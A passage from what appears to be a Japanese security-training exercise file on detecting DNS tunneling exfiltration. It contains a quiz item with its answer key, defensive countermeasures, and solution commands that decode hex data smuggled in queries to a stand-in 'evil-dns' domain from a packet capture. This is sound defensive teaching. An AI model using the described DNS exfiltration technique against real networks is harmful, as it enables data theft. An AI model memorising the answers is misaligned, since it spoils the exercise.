          ['問い合わせ名が異常に長い、またはランダムな文字列に見える', '同じドメインに対して短時間に大量の問い合わせがある', 'TXTレコードなど通常あまり使われない種類のクエリが多い', 'クエリの応答が常に1ミリ秒以内である'], 4,
          '適切でないのは4。応答時間の速さはトンネリングの指標にならない(むしろ外部の攻撃者サーバーへ往復するので遅くなりがち)。有効なのは、名前の長さ・ランダム性(エントロピー)、同一ドメインへの高頻度クエリ、TXT/NULLなど珍しいレコード種別。対策は、社内DNSリゾルバでの記録と異常検知、許可していない外部DNSへの直接通信の遮断。',
          { narration: '「トンネリングらしさ」を示さないものを選ぶ。' }),
      ],
      review: review(
        ['awk でクエリ名の列を取り出して眺める', '異常に長い/ランダムなラベルのドメインを特定', '攻撃者ドメイン宛ての件数を数える', 'cut/tr/xxd でラベルをつなげて16進を復元'],
        [{ cmd: "tcpdump -nr dns.pcap 2>/dev/null | awk '{print $8}'", meaning: 'クエリ名だけを取り出す' }, { cmd: "… | grep evil-dns | awk '{print $8}' | cut -d. -f1 | tr -d '\\n' | xxd -r -p", meaning: '埋め込みデータを復元' }],
        'DNSは許可されやすく、データ持ち出し経路になる。クエリ名の異常(長さ・頻度・種別)を検知できれば、ファイアウォールを素通りする持ち出しを発見できる。',
        'DNSログ/パケットの異常検知、DNSファイアウォール(RPZ)、社内リゾルバ以外への直接DNS通信の遮断、SIEMでのエントロピー検知。',
        ['データ持ち出し', 'C2通信', 'DNS', 'MITRE ATT&CK 持ち出し']),
      learned: ['dns-tunneling', 'data-exfiltration', 'hex-decode', 'dns-anomaly'],
      solution: ['cd /home/analyst/pcap', "tcpdump -nr dns.pcap 2>/dev/null | awk '{print $8}'", 'tcpdump -nr dns.pcap 2>/dev/null | grep -c evil-dns', "tcpdump -nr dns.pcap 2>/dev/null | grep evil-dns | awk '{print $8}' | cut -d. -f1 | tr -d '\\n' | xxd -r -p"],
    },
  ],
};
